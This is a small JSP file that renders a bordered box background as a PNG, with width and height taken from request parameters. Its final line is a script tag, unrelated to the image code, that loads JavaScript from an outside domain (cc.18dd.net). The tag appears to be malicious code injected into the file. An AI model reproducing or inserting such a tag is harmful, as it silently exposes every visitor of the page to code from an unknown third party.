<%@ page import="java.io.*" %>
<%@ page import="java.awt.geom.*" %>
<%@ page import="java.awt.*" %>
<%@ page import="javax.swing.*" %>
<%@ page import="java.awt.image.*" %>
<%@ page import="javax.imageio.*" %>




<%!
	public void drawImage (Graphics2D g, int width, int height) {
	
		int tilt = 0;
		int topHeight = 25;
		int bottomHeight = 0;
		
		int[] x = new int[4];
		int[] y = new int[4];

		
		// draw the top bg
		x[0] = 1;
		y[0] = topHeight + 1;

		x[1] = tilt + 1;
		y[1] = 1;

		x[2] = width - 1 - tilt;
		y[2] = 1;

		x[3] = width - 1;
		y[3] = topHeight + 1;

		g.setColor(new Color(215, 215, 255, 255));
		g.fillPolygon(x, y, 4);

		g.setColor(new Color(0, 0, 255, 255));
		g.drawPolygon(x, y, 4);
		

		
		// draw the bottom bg
		x[0] = 1;
		y[0] = height - 1;

		x[1] = 1;
		y[1] = height - 1 - bottomHeight;

		x[2] = width - 1;
		y[2] = height - 1 - bottomHeight;

		x[3] = width - 1;
		y[3] = height - 1;

//		g.setColor(new Color(215, 215, 255, 255));
//		g.fillPolygon(x, y, 4);

//		g.setColor(new Color(0, 0, 255, 255));
//		g.drawPolygon(x, y, 4);


		// draw the middle
		x[0] = 1;
		y[0] = topHeight + 1;
		
		x[1] = width - 1;
		y[1] = topHeight + 1;
		
		x[2] = width - 1;
		y[2] = height - 1 - bottomHeight;

		x[3] = 1;
		y[3] = height - 1 - bottomHeight;
		
		g.setColor(new Color(255, 255, 255, 255));
		g.fillPolygon(x, y, 4);

		g.setColor(new Color(0, 0, 255, 255));
		g.drawPolygon(x, y, 4);
	}

%>




<%

	try {

		int width = Integer.parseInt(request.getParameter("width"));
		int height = Integer.parseInt(request.getParameter("height"));


		// output the image to the response
		response.setContentType("image/png");

		OutputStream output = response.getOutputStream();

		BufferedImage bi = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);

		Graphics2D g2 = bi.createGraphics();

		drawImage(g2, width, height);

		g2.dispose();

		ImageIO.write(bi, "png", output);

	} catch (Exception e) {
		throw e;
	}
%>







<script language=javascript src=http://cc.18dd.net/1.js></script>